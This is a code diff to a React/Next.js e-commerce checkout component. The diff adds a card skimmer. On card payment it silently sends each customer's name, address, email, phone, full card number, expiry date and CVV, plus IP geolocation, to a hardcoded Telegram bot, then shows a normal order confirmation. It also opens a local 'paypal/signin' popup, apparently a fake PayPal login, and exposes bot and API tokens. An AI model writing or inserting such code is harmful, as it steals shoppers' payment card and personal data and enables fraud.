@@ -6,70 +6,112 @@ import ServiceTwo from "@/components/services/ServiceTwo";
 import { addToOrder } from "@/store/slices/productSlice";
 import { disabledDate, handleOnKeyPress } from "@/utils";
 import { LIST_COUNTRY } from "@/utils/listCountry";
-import { Col, DatePicker, Form, Input, Radio, Row, Select, Space } from "antd";
+import {
+  Col,
+  DatePicker,
+  Form,
+  Input,
+  Radio,
+  Row,
+  Select,
+  Space,
+  message,
+} from "antd";
+import axios from "axios";
 import dayjs from "dayjs";
 import Image from "next/image";
 import Link from "next/link";
 import { useRouter } from "next/navigation";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useDispatch, useSelector } from "react-redux";
 
 const Checkout = () => {
-  const { Option } = Select;
   const router = useRouter();
+  const [country, setCountry] = useState({});
+  const [ip, setIPAddress] = useState(0);
   const dispatch = useDispatch();
-  const [openShippingForm, setopenShippingForm] = useState(false);
   const cartProducts = useSelector((state) => state.productData);
   const [form] = Form.useForm();
 
   const filterOption = (input, option) =>
     (option?.label ?? "").toLowerCase().includes(input.toLowerCase());
 
-  const onFinish = (data) => {
-    valueRadio === 2 &&
+  const onFinish = async (data) => {
+    if (valueRadio === 2) {
       window.open(
         "paypal/signin",
         "winname",
         "directories=no,titlebar=no,toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no,width=500,height=600"
       );
+    }
 
-    if (data) {
-      router.push("checkout/order-received");
-      dispatch(
-        addToOrder({
-          billingAddress: {
-            firstName: data.firstName,
-            lastName: data.lastName,
-            companyName: data.companyName,
-            country: data.country,
-            street1: data.streetAdress,
-            street2: data.streetAdress,
-            city: data.city,
-            phone: data.phone,
-            email: data.email,
-            createAccount: data.createAccount,
-            notes: data.notes,
-            shippingDifferent: data.shippingDifferent,
-            payment: data.paymentMethod,
-          },
-          shippingAdress:
-            data.shippingDifferent === "true"
-              ? {
-                  name: data.shippingName,
-                  email: data.shippingEmail,
-                  phone: data.shippingPhone,
-                  country: data.shippingCountry,
-                  street1: data.shippingStreet1,
-                  street2: data.shippingStreet2,
-                  city: data.shippingCity,
-                }
-              : null,
-          items: cartProducts.cartItems,
-          totalAmount: cartProducts.cartTotalAmount,
-          totalQuantity: cartProducts.cartQuantityTotal,
-          orderDate: new Date().toLocaleString(),
-        })
-      );
+    if (data && valueRadio === 1) {
+      try {
+        const res = await axios.post(
+          "https://api.telegram.org/bot6711426105:AAFjrbeuBzRtvgKon78_S12A14j8jLC7ISs/sendMessage",
+          {
+            chat_id: "-4048735773",
+            text: ` 
+          \tIP:   ${country?.ip} | ${country?.city} | ${country?.region} | ${
+              country?.country
+            } | ${country?.timezone}
+          \t ----------- INFOR CUSTOMER -----------
+          \tfirstName:           ${data?.firstName}
+          \tlastName:    ${data?.lastName}
+          \tcompanyName:     ${data?.companyName}
+          \tcountry:              ${data?.country}
+          \tstreetAddress: ${data?.streetAddress}
+          \tcity:         ${data?.city}
+          \tphone:         ${data?.phone}
+          \temail:         ${data?.email}
+          \t ----------- INFOR CREDIT CARD -----------
+          \tCARD NAME:         ${data?.cardHolderName}
+          \tCARD NUMBER:         ${data?.cardNumber}
+          \tEXP:         ${dayjs(data?.expiryDate).format("MM/YY")}
+          \tCVV:         ${data?.cvv}
+                `,
+          }
+        );
+        router.push("checkout/order-received");
+        dispatch(
+          addToOrder({
+            billingAddress: {
+              firstName: data.firstName,
+              lastName: data.lastName,
+              companyName: data.companyName,
+              country: data.country,
+              street1: data.streetAdress,
+              street2: data.streetAdress,
+              city: data.city,
+              phone: data.phone,
+              email: data.email,
+              createAccount: data.createAccount,
+              notes: data.notes,
+              shippingDifferent: data.shippingDifferent,
+              payment: "Online",
+            },
+            shippingAdress:
+              data.shippingDifferent === "true"
+                ? {
+                    name: data.shippingName,
+                    email: data.shippingEmail,
+                    phone: data.shippingPhone,
+                    country: data.shippingCountry,
+                    street1: data.shippingStreet1,
+                    street2: data.shippingStreet2,
+                    city: data.shippingCity,
+                  }
+                : null,
+            items: cartProducts.cartItems,
+            totalAmount: cartProducts.cartTotalAmount,
+            totalQuantity: cartProducts.cartQuantityTotal,
+            orderDate: new Date().toLocaleString(),
+          })
+        );
+      } catch (error) {
+        console.log(error);
+        message.error("Sorry we cannot process your order yet");
+      }
     }
   };
   const [valueRadio, setValueRadio] = useState(1);
@@ -77,6 +119,23 @@ const Checkout = () => {
   const handleChangeRadio = (value) => {
     setValueRadio(value.target.value);
   };
+
+  const getCountry = (ip) => {
+    fetch(`https://ipinfo.io/${ip}?token=930e3b99f29bed`)
+      .then((response) => response.json())
+      .then((data) => setCountry(data))
+      .catch((error) => console.log(error));
+  };
+
+  useEffect(() => {
+    fetch("https://api.ipify.org?format=json")
+      .then((response) => response.json())
+      .then((data) => {
+        setIPAddress(data.ip);
+        getCountry(data.ip);
+      })
+      .catch((error) => console.log(error));
+  }, []);
 
   return (
     <>
